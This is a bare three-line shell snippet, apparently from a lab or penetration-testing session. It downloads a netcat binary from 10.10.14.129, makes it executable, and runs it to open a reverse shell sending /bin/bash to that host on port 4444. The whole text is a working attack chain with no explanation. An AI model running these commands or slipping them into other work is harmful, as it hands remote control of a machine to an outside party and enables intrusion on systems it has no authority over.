curl 10.10.14.129/nc -o /tmp/nc
chmod +x /tmp/nc
/tmp/nc 10.10.14.129 4444 -e /bin/bash